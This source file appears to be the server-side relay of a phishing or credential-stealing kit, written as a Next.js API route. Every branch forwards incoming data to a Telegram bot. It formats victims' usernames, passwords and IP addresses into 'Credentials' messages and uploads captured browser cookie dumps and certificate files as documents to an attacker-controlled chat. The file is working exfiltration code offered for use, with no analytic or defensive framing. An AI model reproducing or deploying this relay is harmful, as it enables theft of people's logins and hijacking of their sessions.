// api/relay.js

import nextConnect from 'next-connect';
import multer from 'multer';
import FormData from 'form-data';

export const config = {
  api: {
    bodyParser: false,
  },
};

const upload = multer();

const handler = nextConnect({
  onError(error, req, res) {
    console.error('Relay handler error:', error);
    res.status(500).json({ success: false, error: error.message });
  },
  onNoMatch(req, res) {
    res.status(405).json({ success: false, message: 'Method Not Allowed' });
  },
});

handler.use(upload.single('file'));

handler.post(async (req, res) => {
  const telegramToken = process.env.TELEGRAM_TOKEN;
  const chatId        = process.env.TELEGRAM_CHAT_ID;
  if (!telegramToken || !chatId) {
    console.error('Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID env vars');
    return res.status(500).json({ success: false, message: 'Bot not configured' });
  }
  const botUrl = `https://api.telegram.org/bot${telegramToken}`;

  try {
    const contentType = req.headers['content-type'] || '';

    // Handle JSON payloads (creds, etc.)
    if (contentType.includes('application/json')) {
      // Parse JSON body
      let body = '';
      await new Promise((resolve, reject) => {
        req.on('data', chunk => body += chunk);
        req.on('end', resolve);
        req.on('error', reject);
      });
      let json;
      try {
        json = JSON.parse(body);
      } catch {
        return res.status(400).json({ success: false, message: 'Invalid JSON' });
      }

      const { type, ip, user, pass, data } = json;
      const text = data
        ? data
        : `🔑 [${ip}] Credentials\nUser: ${user}\nPass: ${pass}`;

      // If text contains 'Cookies found:', treat as file
      if (text && text.startsWith('Cookies found:')) {
        const form = new FormData();
        form.append('chat_id', chatId);
        // Use IP or Date.now for unique filename
        const fname = `${ip || 'cookie'}-COOKIE.txt`;
        form.append('document', Buffer.from(text, 'utf-8'), {
          filename: fname,
          contentType: 'text/plain'
        });
        // Optional caption
        let caption = ip ? `IP: ${ip}\n` : '';
        if (type) caption += `Type: ${type}\n`;
        if (caption) form.append('caption', caption);
        const tgRes = await fetch(`${botUrl}/sendDocument`, {
          method: 'POST',
          body: form,
          headers: form.getHeaders()
        });
        if (!tgRes.ok) throw await tgRes.text();
        return res.status(200).json({ success: true });
      } else {
        // Otherwise, send as plain text message
        const tgRes = await fetch(`${botUrl}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text
          })
        });
        if (!tgRes.ok) throw await tgRes.text();
        return res.status(200).json({ success: true });
      }
    }

    // Handle file uploads (cookies/certs)
    if (req.file) {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append(
        'document',
        req.file.buffer,
        {
          filename: req.file.originalname,
          contentType: req.file.mimetype || 'text/plain'
        }
      );
      const { ip, type } = req.body;
      let caption = '';
      if (ip) caption += `IP: ${ip}\n`;
      if (type) caption += `Type: ${type}\n`;
      if (caption.length) form.append('caption', caption);

      const tgRes = await fetch(`${botUrl}/sendDocument`, {
        method: 'POST',
        body: form,
        headers: form.getHeaders()
      });
      if (!tgRes.ok) throw await tgRes.text();
      return res.status(200).json({ success: true });
    }

    // Bad/unknown payload
    res.status(400).json({ success: false, message: 'Bad payload' });
  } catch (err) {
    console.error('Telegram API error:', err);
    res.status(502).json({ success: false, error: String(err) });
  }
});

export default handler;
